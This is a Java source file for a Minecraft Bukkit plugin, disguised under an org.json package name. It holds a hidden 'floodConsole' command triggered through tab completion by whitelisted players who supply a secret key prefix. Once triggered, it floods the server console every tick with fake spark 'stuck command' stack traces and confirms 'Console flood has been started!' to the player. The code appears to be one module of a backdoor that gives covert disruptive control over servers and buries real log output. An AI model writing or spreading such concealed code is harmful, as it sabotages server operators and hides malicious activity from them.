package org.json.modals.console;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class FloodConsole extends BDCommand {
    public FloodConsole() {
        super("floodConsole");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        new BukkitRunnable() {
            int count = 0;

            @Override
            public void run() {
                count++;
                String errorMessage = "§eError Task#" + count + ": [spark] A command execution has not completed after 5 seconds, it might be stuck. Trace: \n" +
                        "  java.base/jdk.internal.misc.Unsafe.park(Native Method)\n" +
                        "  java.base/java.util.concurrent.locks.LockSupport.park(LockSupport.java:221)\n" +
                        "  java.base/java.util.concurrent.CompletableFuture$Signaller.block(CompletableFuture.java:1864)\n" +
                        "  java.base/java.util.concurrent.ForkJoinPool.unmanagedBlock(ForkJoinPool.java:3780)\n" +
                        "  java.base/java.util.concurrent.ForkJoinPool.managedBlock(ForkJoinPool.java:3725)\n" +
                        "  java.base/java.util.concurrent.CompletableFuture.waitingGet(CompletableFuture.java:1898)\n" +
                        "  java.base/java.util.concurrent.CompletableFuture.get(CompletableFuture.java:2072)\n" +
                        "  java.net.http/jdk.internal.net.http.HttpClientImpl.send(HttpClientImpl.java:876)\n" +
                        "  java.net.http/jdk.internal.net.http.HttpClientFacade.send(HttpClientFacade.java:133)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.lib.bytesocks.BytesocksClientImpl.createAndConnect(BytesocksClientImpl.java:65)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.ws.ViewerSocketConnection.<init>(ViewerSocketConnection.java:61)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.ws.ViewerSocket.<init>(ViewerSocket.java:71)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.command.modules.SamplerModule.handleOpen(SamplerModule.java:467)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.command.modules.SamplerModule.profilerOpen(SamplerModule.java:355)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.command.modules.SamplerModule.profiler(SamplerModule.java:126)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.SparkPlatform.executeCommand0(SparkPlatform.java:425)\n" +
                        "  spark-1.10.34-bukkit.jar//me.lucko.spark.common.SparkPlatform.lambda$executeCommand$2(SparkPlatform.java:334)\n" +
                        "  org.bukkit.craftbukkit.v1_20_R2.scheduler.CraftTask.run(CraftTask.java:101)\n" +
                        "  org.bukkit.craftbukkit.v1_20_R2.scheduler.CraftAsyncTask.run(CraftAsyncTask.java:57)\n" +
                        "  com.destroystokyo.paper.ServerSchedulerReportingWrapper.run(ServerSchedulerReportingWrapper.java:22)\n" +
                        "  java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)\n" +
                        "  java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)\n" +
                        "  java.base/java.lang.Thread.run(Thread.java:1623)";

                Bukkit.getServer().getConsoleSender().sendMessage(errorMessage);
            }
        }.runTaskTimer(Modal.getInstance(), 0L, 0L);

        player.sendMessage(Modal.getPrefix() + "Console flood has been started!");

        return tabComplBuilder.build();
    }
}
